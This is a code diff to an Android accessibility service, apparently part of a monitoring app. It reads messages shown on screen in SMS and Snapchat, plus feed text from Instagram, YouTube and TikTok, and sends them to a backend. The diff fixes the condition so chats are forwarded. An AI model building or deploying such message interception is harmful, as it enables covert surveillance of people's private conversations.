@@ -79,6 +79,7 @@ class MyAccessibilityService : AccessibilityService() {
             packageName.contains("mms")        -> "SMS"
             packageName.contains("snapchat")  -> "Snapchat"
             
+            
             else -> null
         }
 
@@ -91,7 +92,7 @@ class MyAccessibilityService : AccessibilityService() {
                 else -> null
             }
 
-            if (contentAppName != null && chatAppName == null) {
+            if (contentAppName != null ) {
     val source = event.source ?: return
     val contentTexts = extractContentText(source, contentAppName)
     contentTexts.forEach { text ->
@@ -105,29 +106,47 @@ class MyAccessibilityService : AccessibilityService() {
     }
 }
 
-        if (  chatAppName == null) {
-            val source = event.source ?: return
-            val messages = extractChatMessages(source)
-
-            messages.forEach { message ->
-                if (message.isNotBlank() && message.length > 3) {
-                    val now = System.currentTimeMillis()
-
-                    if (message != lastSentMessage || now - lastSentTime > COOLDOWN_MS) {
-                        lastSentMessage = message
-                        lastSentTime    = now
-
-                        Log.d("ChatMonitor", "App: $chatAppName | Msg: $message")
-
-                        // Sending  to backend
-                        sendChatToBackend(appName = chatAppName, message = message, node = source)
-
-                        // Sending chats to flutter
-                        channel?.invokeMethod("onChatText", message)
-                    }
-                }
+if (chatAppName != null) {
+    val source = event.source ?: return
+    val messages = extractChatMessages(source)
+    
+    messages.forEach { msg ->
+        val now = System.currentTimeMillis()
+        if (msg != lastSentMessage || now - lastSentTime > COOLDOWN_MS) {
+            lastSentMessage = msg
+            lastSentTime = now
+            Log.d("ChatMonitor", "App: $chatAppName | Msg: $msg")
+            sendChatToBackend(appName = chatAppName, message = msg, node = source)
+        }
+    }
+}
+   
+if (contentAppName != null) {
+    // Instagram ke liye sirf feed/scroll events pe content bhejo
+    val isFeedEvent = event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
+                      event.eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED
+    
+    // YouTube, TikTok — har event pe content bhejo
+    // Instagram — sirf feed events pe
+    val shouldMonitorContent = when (contentAppName) {
+        "Instagram" -> isFeedEvent
+        else -> true
+    }
+    
+    if (shouldMonitorContent) {
+        val source = event.source ?: return
+        val contentTexts = extractContentText(source, contentAppName)
+        contentTexts.forEach { text ->
+            val now = System.currentTimeMillis()
+            if (text != lastSentMessage || now - lastSentTime > COOLDOWN_MS) {
+                lastSentMessage = text
+                lastSentTime = now
+                Log.d("ContentMonitor", "App: $contentAppName | Text: $text")
+                sendContentToBackend(appName = contentAppName, content = text)
             }
         }
+    }
+}   
     }
 
     // Extract Messages from Screen
